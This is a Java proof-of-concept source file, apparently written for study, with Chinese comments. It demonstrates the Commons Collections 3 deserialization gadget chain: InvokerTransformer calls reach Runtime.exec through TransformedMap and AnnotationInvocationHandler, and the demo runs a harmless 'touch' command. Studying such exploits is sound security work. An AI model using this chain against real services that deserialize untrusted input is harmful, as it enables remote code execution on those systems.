package com.xyh.collections3;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * Map反序列化漏洞
 *
 *
 */
public class SerializeMapForTransformer
{
    public static void main( String[] args ) throws Exception {
        //create命令链
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"touch /_"}),
        };
        Transformer transformer = new ChainedTransformer(transformers);

        //利用AnnotationInvocationHandler反序列化，直接触发Transformer
        testAnnotationInvocationHandlerMap(transformer);

        //测试TransformerMap在map的key、value改变中触发
//        testMap(transformer);

        //测试重写readObject方法反序列化
//        testReadObject();

    }

    /**
     * 测试AnnotationInvocationHandler反序列化中，直接触发Transformer
     *
     */
    private static void testAnnotationInvocationHandlerMap(Transformer transformer) throws Exception{
        //转化map
        Map innerMap = new HashMap();
        innerMap.put("value","2");
        Map ouputMap = TransformedMap.decorate(innerMap,null,transformer);
        //jdk1.8该类的方法readObject()是使用了native方法安全更新map，无法再触发
        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        ctor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);
        //序列化输出
        byte[] bytes = serialize(o);
        //反序列化
        deserialize(bytes);
    }

    /**
     * 测试TransformerMap在包装的map中，key、value改变触发Transformer
     *
     */
    private static void testMap(Transformer transformer) throws Exception{
        //转化map
        Map ouputMap = TransformedMap.decorate(new HashMap<>(),null,transformer);
        //序列化输出
        byte[] bytes = serialize(ouputMap);
        //反序列化
        Map innerMap = deserialize(bytes);
        //put操作触发，命令链
        innerMap.put("2","orange");
    }

    /**
     * 测试重写readObject是否可以在反序列化中优先执行
     *
     */
    private static void testReadObject() throws Exception {
        A a = new A();
        //序列化
        byte[] bytes = serialize(a);
        A a1 = deserialize(bytes);
    }

    /**
     * 序列化
     *
     */
    private static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(o);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return bytes;
    }

    /**
     * 反序列化
     *
     */
    private static <T>T deserialize(byte[] bytes) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        T o = (T) objectInputStream.readObject();
        objectInputStream.close();
        return o;
    }
}
class A implements Serializable{
    private void readObject(ObjectInputStream var1) {
        System.out.println("exec readObject");
    }
}
